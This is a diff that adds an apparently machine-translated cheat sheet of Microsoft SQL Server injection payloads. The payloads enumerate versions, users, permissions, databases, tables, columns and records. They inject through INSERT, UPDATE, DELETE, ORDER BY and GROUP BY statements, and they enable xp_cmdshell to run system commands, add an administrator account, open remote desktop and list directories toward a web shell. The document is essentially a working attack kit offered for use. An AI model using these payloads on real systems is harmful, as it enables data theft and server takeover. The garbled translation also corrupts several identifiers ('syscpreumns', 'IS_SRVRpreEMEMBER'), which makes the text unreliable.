@@ -1,0 +1,169 @@
+
+    Get basic information
+    Judgment branch does not support stack query:
+    ;declare @d int–
+    ;select count(*) from sysobjects– 
+
+    To determine whether the station library separation:
+    and 1=(@@servername%2b’|’%2bhost_name())–Determine if XP_CMDSHELL exists:
+    and 1=(Select count(*) FROM master..sysobjects Where xtype = ‘X’ AND name = ‘xp_cmdshell’) —
+
+    See if the xp_regread extended stored procedure exists
+    and 1=(select count(*) FROM master..sysobjects where name= ‘xp_regread’)–
+
+    Exploded database version:
+    and 1=@@version–
+
+    Explosion host name:
+    and 1=host_name()–
+
+    Explosive local service name:
+    and 1=@@servername–
+
+    Explode the current database:
+    and 1=quotename(db_name())–
+    and 1=db_name() %2b’|’–
+    Get user and privilege information
+    Explode the current database users:
+    and 1=user–
+    and 1=quotename(user)–Gets the current database permissions:
+    and 1=(select IS_SRVRpreEMEMBER(‘sysadmin’))
+    and 1=(Select IS_MEMBER(‘db_owner’))
+    and 1=(select IS_srvrpreemember(‘public’))
+    and 1= (Select HAS_DBACCESS(‘database’))
+
+    The following commands only apply to SQL Server 2005 and above
+    and 1= has_perms_by_name(db_name(), ‘DATABASE’, ‘ANY’)
+    and 1= has_perms_by_name(‘master’, ‘DATABASE’, ‘ANY’)
+    Gets the database information
+    Number of all databases:
+    and 1=(select quotename(count(name)) from master..sysdatabases)–
+    and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases) —
+    and 1=(select str(count(name))%2b’|’ from master..sysdatabases) — 
+
+    Number of Explosive User Databases:
+    and 1=(select quotename(count(name)) from master..sysdatabases where dbid>5)–
+    and 1=(select str(count(name))%2b’|’ from master..sysdatabases where dbid>5) —
+    and 1=(select cast(count(name) as varchar)%2bchar(1) from master..sysdatabases where dbid>5) — 
+
+    Explode the database one by one:
+    and 1=quotename(db_name(N))–
+    and 1=db_name(N)%2b’|’–
+    and 1=(select name%2b’|’ from master..sysdatabases where dbid=5)–
+    and 1=(select name%2bchar(1) from master..sysdatabases where dbid=5)–
+    and 1=(select top 1 quotename(name) from master..sysdatabases where dbid not in(select top N dbid from master..sysdatabases))– 
+
+    All bursts of a database (only mssql2005 and above):
+    and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(”))–
+    and 1=(select ‘|’%2bname%2b’|’ from master..sysdatabases FOR XML PATH(”))– 
+
+    FOR XML PATH can be based on the output of the query results into XML format. Such as the prompt “string or binary data will be truncated. Statement has been terminated.” Error, because the amount of data is too large, available substring function extraction times. Besides that
+    and 1=(select name from master..sysdatabases FOR XML RAW)–
+    and 1=(select name from master..sysdatabases FOR XML Auto)–
+    Gets the table information in the database
+    Blast the number of tables in the specified database:
+    and 1=(select quotename(count(*)) from The_database_name..sysobjects where xtype=’U’) —
+    and 1=(select cast(count(*) as varchar)%2b’|’ from The_database_name..sysobjects where xtype=’U’) —
+    and 1=(select cast(count(*) as varchar)%2bchar(1) from The_database_name..sysobjects where xtype=0x55)– 
+
+    Explosion-specific designated database table:
+    and 0<>(select top 1 quotename(name) from The_database_name..sysobjects where xtype=’U’ where Exclusion_criteria)–
+    and 1=convert(int,(select top 1 table_name from information_schema.tables))–
+    and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in(‘xxxx’)))– 
+
+    A burst database all tables (only mssql2005 and above):
+    and 1=(select quotename(name) from The_database_name..sysobjects where xtype=’U’ FOR XML PATH(”))–
+    and 1=(select ‘|’%2bname%2b’|’ from The_database_name..sysobjects where xtype=’U’ FOR XML PATH(”))–
+    Gets the information from the columns in the database table
+    Columnar number in the explosion specification table:
+    and 1=(select quotename(count(name)) from The_database_name..syscpreumns where id=(select id from The_database_name..sysobjects where name=’Specified table name’ ))–
+    and 1=(select cast(count(name) as varchar)%2bchar(1) from The_database_name..syscpreumns where id=(select id from The_database_name..sysobjects where name=’Specified table name’ ))– 
+
+    Explicitly specify the columns of the table:
+    and 1=(select top 1 quotename(cpre_name(object_id(‘Specified table name’),N)) from The_database_name..sysobjects)–
+    and 1=(select quotename(name) from The_database_name..syscpreumns where id =(select id from The_database_name..sysobjects where name=’Specified table name’) and cpreid=N
+    and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=’Specified table name’ )–
+    and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=’Specified table name’ and column_name not in(‘Table Name’) )– 
+
+    Sub-burst All columns of the specified table (mssql2005 and above only):
+    and 1=(select quotename(name) from Table Name..syscpreumns where id =(select id from The_database_name..sysobjects where name=’Specified table name’) FOR XML PATH(”))–
+    and 1=(select ‘|’%2bname%2b’|’ from The_database_name..syscpreumns where id =(select id from The_database_name..sysobjects where name=’Specified table name’) FOR XML PATH(”))–
+    Retrieve data
+    Exploding the number of records in the specified table:
+    and 1=(select quotename(count(*)) from “Specifies the database”..”Specified table name”)–
+    and 1=(select cast(count(*) as varchar)%2b’|’ from “Specifies the database”..”Specified table name”)–The column-by-column specification specifies the data for the column:
+    and 1=(select top 1 quotename(“Specified column name”1)%2bquotename(“Specified column name”2) from “Specifies the database”..”Specified table name” where”Exclusion criteria”)–
+    and 1=(select top 1 cast(“Specified column name”1 as varchar)%2b’|’%2bcast(“Specified column name”2 as varchar) from “Specifies the database”..”Specified table name” where”Exclusion criteria”)–Burst one by one all the specified table data fields ( limited to mssql2005 and above ):
+    and 1=(select top 1 * from “Specifies the database”..”Specified table name” where”Exclusion criteria” FOR XML PATH(”))–
+
+    The N data burst at once all fields ( limited to mssql2005 and above ):
+    and 1=(select top N * from “Specifies the database”..”Specified table name” FOR XML PATH(”))–
+    Insert、Update、Delete、Order By、Group By、Top Injection
+    Insert
+    insert into users values(‘vk’,convert(int,@@version))–,’123′)
+    nsert into users values(‘vk’,’123′ + convert(int,@@version))–‘)
+    insert into users values(‘vk’,’123′) if substring(user,1,1)=’d’ waitfor delay ‘0:0:5’ else select 2–‘)Update
+    update users set uname=’vvvk’,upass=’11111′ where uid=1 and 1=convert(int,@@version)
+    update users set uname=’vvvk’,upass=’11111’+convert(int,@@version)+” where uid=1
+    update users set uname=’vvvk’,upass=’11111′ where uid=1 if substring(user,1,1)=’d’ waitfor delay ‘0:0:5’ else select 2
+
+    Delete
+    Delete from users where uid =9+convert(int,@@version)
+    Delete from users where uid =9 and 1=convert(int,@@version)
+    Delete from users where uid =9 if substring(user,1,1)=’d’ waitfor delay ‘0:0:5’ else select 2
+
+    Order By:
+    select * from users order by uid,convert(int,@@version)
+    select * from users order by uid+convert(int,@@version)
+    select * from users order by uid if substring(user,1,1)=’d’ waitfor delay ‘0:0:5’ else select 2
+
+    Group By:
+    select count(uid),uname from users group by uid,uname union select ‘1’,’2′
+    select count(uid),uname from users group by uid,uname,uname+convert(int,@@version)
+    select count(uid),uname from users group by uid,uname if substring(user,1,1)=’d’ waitfor delay ‘0:0:5’ else select 2
+
+    Top
+    select top 1 @@version,* from users
+    select top 0 1 from sysobjects union select @@version–,* from users
+    Use of stored procedures
+    Commonly used stored procedures:
+    xp_cmdshell — use this stored procedure can directly execute system commands
+    xp_regread —- use this stored procedure can read the registry
+    xp_regwrite —- use this stored procedure can be written to the registry
+    xp_dirtree —- use this storage The process can be a directory operation
+    xp_enumdsn — use this stored procedure can be odbc connection
+    xp_loginconfig – use this stored procedure can be configured server security mode informationCheck whether it is enabled:
+    and 1=(Select count(*) from master..sysobjects where xtype=’X’ and name='”Stored procedure name”‘)–
+    Use the xp_cmdshel
+    Check if xp_cmdshell is enabled:
+    and 1=(Select count(*) from master..sysobjects where xtype=’X’ and name=’xp_cmdshell’)–Remove xp_cmdshell:
+    ;exec sp_dropextendedproc ‘xp_cmdshell’–
+
+    Enable the xp_cmdshell (requires database support stacked queries) :
+    ;EXEC sp_addextendedproc xp_cmdshell ,@dllname =’xplog70.dll’ —
+    ;EXEC sp_configure ‘show advanced options’, 1;RECONFIGURE;EXEC sp_configure ‘xp_cmdshell’, 1;RECONFIGURE–
+
+    Use xp_cmdshell to execute system commands:
+    ;exec master..xp_cmdshell “System command” —
+    Permeability of different methods
+    SA permissions:
+    + the target server to open the remote desktop, then the direct establishment of the system account password, remote login, access to the target server permissions:
+    ;exec master..xp_cmdshell “net user “account password” /add %26%26 net localgroup administrators “account number” /add” —
+    + If the target server does not open the remote desktop, use the following command to open it:
+    ;exec master..xp_regwrite ‘HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentContrpreSet\Contrpre\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;–DB_OWNER Permissions:
+
+    The main idea is to list the directory – the backup to get the shell.
+    1, access WEB physical path:
+    ;create table temp (dir nvarchar(255),depth varchar(255),files varchar(255),id int not null identity (1,1));–
+
+    Create a table, a total of four fields, the first three fields used to store the implementation of stored procedures xp_dirtree return results, ID field is convenient to query the specified content.
+    ;insert into temp (dir,depth,files) exec master..xp_dirtree ‘”The absolute path to the directory to browse”‘,1,1–
+
+    Use xp_dirtree to insert the files and folders of the specified path into the table.
+    and 1=(select quotename(dir) from temp where id=1)–
+
+    Through the enumeration id value of the temporary table to save a file and directory to check out.
+    and 1=(select quotename(dir) from temp where id=1)–
+
+    A list of all the files and directories stored in the table to check out. Only mssql2005 and above.
+    ;drop table temp;–
